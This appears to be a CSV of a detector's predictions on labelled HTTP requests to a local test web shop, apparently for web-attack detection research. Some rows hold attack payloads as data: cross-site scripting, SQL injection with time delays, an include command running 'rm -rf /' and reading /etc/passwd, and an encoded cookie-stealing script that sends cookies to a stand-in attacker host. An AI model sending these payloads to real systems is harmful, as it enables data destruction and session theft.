Prediction, Actual, Confidence, Method, Content, URL
0, 0, 99.54%, GET, , http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0, 0, 99.54%, GET, , http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
1, 1, 78.37%, POST, modo=insertar&precio=9536&B1=Pasar+por+caja%2F, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1, 1, 99.87%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp/asf-logo-wide.gif/.INC HTTP/1.1
1, 1, 91.06%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=69&B1=A%F1adir+al+carrito HTTP/1.1
1, 1, 99.66%, POST, modo=registro&login=snuggs&password=Recie.ntE&nombre=Caritian&apellidos=Celaya+Gaytan&email=treman_worde%40pavimentosalagon.so&dni=75925253E&direccion=Carrer+Sant+Celoni+39%2C+8-H&ciudad=Cepeda+la+Mora&cp=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&provincia=Sevilla&ntc=0439326406567851&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1, 1, 68.64%, POST, modo=entrar&login=abdullah&pwdA=cOrcusIdO&remember=on&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0, 0, 99.87%, GET, , http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
1, 1, 90.48%, POST, idA=1, http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0, 0, 99.54%, GET, , http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0, 0, 84.62%, POST, B2=Vaciar+carrito, http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
1, 0, 53.63%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=77&B1=A%F1adir+al+carrito HTTP/1.1
1, 0, 56.61%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=suzuki&pwd=ejerci78&remember=off&B1=Entrar HTTP/1.1
1, 1, 92.27%, GET, , http://localhost:8080/tienda1/publico/4861362529278789730 HTTP/1.1
1, 1, 87.55%, POST, modoA=entrar&login=simon-ch&pwd=Sur%3FTidO&remember=on&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1, 1, 81.24%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=2%2F&nombre=Queso+Manchego&precio=100&cantidad=77&B1=A%F1adir+al+carrito HTTP/1.1
0, 0, 99.33%, GET, , http://localhost:8080/tienda1/index.jsp HTTP/1.1
1, 0, 50.86%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sanabria&pwd=s074ido3&remember=on&B1=Entrar HTTP/1.1
0, 0, 99.52%, GET, , http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
1, 1, 66.96%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=onder&password=cORT%E9SMenTE&nombre=Pancracio&apellidos=Joves+Sagreras&email=darcy%40risiberia.gr&dni=20934634B&direccion=Avenida+Deportes+35+&ciudad=Santa+Croya+de+Tera&cp=13326&provincia=Zaragoza&ntc=7238071991283064+&B1=Registrar HTTP/1.1
0, 0, 97.15%, GET, , http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
1, 1, 82.95%, POST, id=3&nombreA=Vino+Rioja&precio=100&cantidad=85&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0, 1, 79.77%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectasAND+1%3D1 HTTP/1.1
0, 1, 80.80%, GET, , http://localhost:8080/tienda1/global/estilos.css.Bak HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
1, 1, 77.28%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sydney&pwd=r%24aToNESCA&rememberA=off&B1=Entrar HTTP/1.1
1, 1, 78.34%, POST, modo=insertar&precio=5191&B1=Confirmar%2F, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
0, 0, 76.38%, POST, id=2, http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
1, 1, 67.91%, POST, modo=insertar&precio=%3F&B1=Pasar+por+caja, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1, 1, 65.79%, POST, modo=registro&login=hulda&password=escocer&nombre=Artemio&apellidos=Subirat&email=mobley_bonn%40delujos.cv&dni=54601063Y&direccion=Navaluenga%2C+120+11%3FA&ciudad=Alcal%E1+de+Henares&cp=44620&provincia=C%2Fu%2Fenca&ntc=6658698118800512&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1, 1, 75.16%, GET, , http://localhost:8080/tienda1/global.OLD HTTP/1.1
0, 0, 99.57%, GET, , http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
1, 0, 75.62%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cyros&password=39sch6nz6da&nombre=Adelia&apellidos=Yamile+De+Francisco&email=hawker-wiese7%40tradora.mg&dni=37244804F&direccion=Calle+Isla+De+La+Toja+84%2C+&ciudad=Membr%EDo&cp=39584&provincia=Palencia&ntc=5793462659286586&B1=Registrar HTTP/1.1
0, 0, 94.68%, POST, errorMsg=Credenciales+incorrectas, http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1, 0, 50.86%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=jabir&pwd=caMbiazo&remember=on&B1=Entrar HTTP/1.1
1, 1, 55.37%, POST, B2=%2500, http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
0, 0, 99.46%, GET, , http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
1, 1, 85.85%, POST, modo=entrar&login=nelon&pwd=EquIN57erMo&remember=off%2F&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0, 0, 99.93%, GET, , http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
0, 0, 99.93%, GET, , http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
1, 1, 99.88%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yanshek&pwd=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&remember=off&B1=Entrar HTTP/1.1
0, 0, 99.93%, GET, , http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
1, 1, 92.96%, POST, B2A=Vaciar+carrito, http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
0, 0, 76.38%, POST, id=2, http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0, 0, 99.78%, GET, , http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
1, 1, 98.46%, POST, modo=registro&login=arron&password=boDegoNcillo&nombre=Betiana&apellidos=Argente+Botifoll&email=peckinpah-keams%40juguetespersonales.tz&dni=10867689M&direccion=Periodista+Juanito+Cortes%2C+95+&ciudad=Set-cookie%253A%2BTamper%253D1041264011025374727&cp=38770&provincia=Badajoz&ntc=6222371193056945&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0, 1, 85.72%, GET, , http://localhost:8080/estore/populate HTTP/1.1
0, 0, 99.93%, GET, , http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
1, 1, 99.57%, POST, modo=registro&login=briard&password=ur7anismo&nombre=Vitalbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&apellidos=Bonafina+Cansino&email=gayou%40transportesvegasl.bm&dni=65630152C&direccion=C%2F+Marques+De+Lema+188+13G&ciudad=Rueda+de+Jal%F3n&cp=03510&provincia=Le%F3n&ntc=7816475254908142&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 1, 59.42%, GET, , http://localhost:8080/compass/logon.jsp HTTP/1.1
0, 1, 80.80%, GET, , http://localhost:8080/tienda1/global/estilos.css.BAK HTTP/1.1
1, 1, 63.55%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=helem&password=aPAreCEr&nombre=Pancho&apellidos=Goldaratz+Brizuela&email=lahbib_hodo%40silver-knights.ie&dni=54489862X&direccion=Berlin+116+&ciudadA=Sudanell&cp=24346&provincia=Burgos&ntc=3191456339688389&B1=Registrar HTTP/1.1
1, 1, 99.00%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ovas%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&pwd=ric8Me6te&remember=on&B1=Entrar HTTP/1.1
1, 1, 78.65%, POST, modo=entrar&login=eriks&pwd=salSa&rememberA=off&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0, 0, 99.46%, GET, , http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
1, 1, 87.68%, POST, id=3&nombre=Vino+.*%3FRioja&precio=100&cantidad=20&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0, 0, 99.57%, GET, , http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
0, 0, 53.84%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3578&B1=Pasar+por+caja HTTP/1.1
0, 0, 99.93%, GET, , http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
1, 1, 98.88%, GET, , http://localhost:8080/tienda1/imagenes/2.gif/asf-logo-wide.Bak HTTP/1.1
1, 1, 88.85%, POST, modoA=insertar&precio=112&B1=Pasar+por+caja, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
0, 1, 61.90%, GET, , http://localhost:8080/tienda1/miembros/index.jsp.INC HTTP/1.1
0, 0, 94.64%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
1, 1, 91.14%, POST, modoA=insertar&precio=3574&B1=Pasar+por+caja, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1, 1, 89.22%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2832&B1=Confirmar%2F HTTP/1.1
1, 0, 65.88%, POST, id=2&nombre=Vino+Rioja&precio=85&cantidad=76&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0, 0, 99.54%, GET, , http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0, 0, 53.84%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2793&B1=Pasar+por+caja HTTP/1.1
0, 0, 99.33%, GET, , http://localhost:8080/tienda1/index.jsp HTTP/1.1
0, 0, 97.15%, GET, , http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
0, 0, 99.09%, GET, , http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
0, 0, 84.62%, POST, B2=Vaciar+carrito, http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
1, 1, 98.81%, POST, id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=84&B1=A%F1adir+al+carrito%22+AND+%221%22%3D%221, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0, 1, 68.88%, GET, , http://localhost:8080/tienda1/global/menum.jsp/4861362529278789730 HTTP/1.1
0, 0, 99.09%, GET, , http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
1, 1, 85.15%, POST, modo=insertar&precio=2579&B1A=Confirmar, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1, 1, 96.76%, GET, , http://localhost:8080.Bak HTTP/1.1
1, 1, 73.05%, POST, modo=entrar&login=hua-yuan&pwdA=*anoria&remember=off&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1, 1, 96.06%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1
0, 0, 99.33%, GET, , http://localhost:8080/tienda1/index.jsp HTTP/1.1
0, 0, 84.62%, POST, B2=Vaciar+carrito, http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
1, 1, 77.56%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=zalman&password=*diet%E9tico&nombre=Adiel&apellidos=Fabr%E9s+Bueso&email=riegert_tao-lin%40sanchezquesada.ke&dni=11051114M&direccion=Avenida+San+Mames%2C+25%2C+&ciudad=Carriches&cp=0822A&provincia=Guadalajara&ntc=7998962855410697&B1=Registrar HTTP/1.1
0, 0, 60.96%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9006&B1=Confirmar HTTP/1.1
1, 1, 59.58%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%4040&B1=Pasar+por+caja HTTP/1.1
1, 1, 99.85%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=tsong-li0&pwd=4oM4a1rO173To&remember=on%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=Entrar HTTP/1.1
1, 0, 80.42%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=silvie&password=metac%E9ntrico&nombre=Tel%E9sfora&apellidos=Pao+Villalobos&email=soldati%40legami.so&dni=96399738E&direccion=C%2F+Padre+Francisco+S%2FN%2C+&ciudad=Alfafara&cp=29380&provincia=La+Rioja&ntc=1246947052735749&B1=Registrar HTTP/1.1
1, 1, 83.21%, POST, id=2&nombre=Queso+Manchego&precio=100&cantidad=97&B1A=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
0, 0, 99.54%, GET, , http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
0, 0, 97.15%, GET, , http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
0, 0, 96.27%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
1, 1, 84.26%, POST, modo=registro&login=jenn&password=afrancESamienTo&nombre=Ada&apellidos=Matar%F3+I%F1iguez&email=newfield.watase%40cortinasartesol.yu&dni=75678701F&direccion=Prof*esor+Francisc*o+Grande+Covia*n+S%2FN%2C+&ciudad=Santo+Domingo+de+la+Calzada&cp=45179&provincia=Albacete&ntc=9167215819238112&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0, 0, 99.52%, GET, , http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
0, 0, 99.52%, GET, , http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
1, 1, 79.95%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=morgan-c&password=ventera&nombre=Abdel&apellidos=Gortari&email=ericsson%40lalectura.gr&dniA=93062910B&direccion=C%2F+Barlovento%2C+111%2C+5%3FH&ciudad=Amurrio&cp=25289&provincia=Guip%FAzcoa&ntc=8608089924764976&B1=Registrar HTTP/1.1
1, 1, 99.86%, POST, errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E, http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1, 1, 99.99%, POST, modo=registro&login=cassondr&password=I658CT8&nombre=Alcides&apellidos=Cabanilla+Dumenj%F3&email=odermar%40cafedeteatro.tj&dni=57363582H&direccion=Calle+General+Sanz+Pastor+139+6C&ciudad=Vila+de+Cruces&cp=06185&provincia=Ja%E9n&ntc=3802015475330512&B1=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 1, 59.35%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=b%3Fennet*t&password=DI26MI61&nombre=Lupo&apellidos=Planells+Teixid%F3&email=mcglory_natalia%40asesoriaviesca.sh&dni=84720383K&direccion=Pontillon%2C+162%2C+1G&ciudad=Navaquesera&cp=19390&provincia=Sevilla&ntc=5499470250597505&B1=Registrar HTTP/1.1
0, 0, 87.47%, GET, , http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
1, 1, 85.30%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1
1, 1, 99.97%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=absi&password=PrIMogEnitURa&nombre=Sem&apellidos=Bettini&email=phillott%40g-audio.cf&dni=88374981B&direccion=Calle+Zubia+7+&ciudad=Gar%EDnoain&cp=10189&provincia=Lleida&ntc=0957957573117060&B1=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F HTTP/1.1
1, 1, 85.30%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1
1, 1, 62.63%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=aida&password=plant%EDgrad*a&nombre=Tranquilino&apellidos=Atienza+Carrillo&email=doude%40espanolynegocios.%40ru&dni=63154198Q&direccion=Rua+Entrevias%2C+68+12-C&ciudad=Massalfassar&cp=48220&provincia=Salamanca&ntc=5370548572435408&B1=Registrar HTTP/1.1
1, 0, 72.45%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=brana&password=f5-c21s7&nombre=Abd%F3n&apellidos=Huertas+Acosa&email=kreuzer%4011horas.ag&dni=09831514A&direccion=C%2F+Barja+187+&ciudad=Navaescurial&cp=32505&provincia=Madrid&ntc=6588349336548778&B1=Registrar HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
1, 1, 67.84%, POST, modo=registro&login=pebrook&password=i8OL6L%2C18%EDa&nombre=Edgar&apellidos=Sumariva+Santamar%EDa&email=rosanova-angelo%40dissident.mm&dni=43646821C&direccion=Via+Complutense%2C+76%2C+&ciudad=Miguelturra&cp=09390&provincia=Palencia&ntc=8153377554882034&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 0, 99.54%, GET, , http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
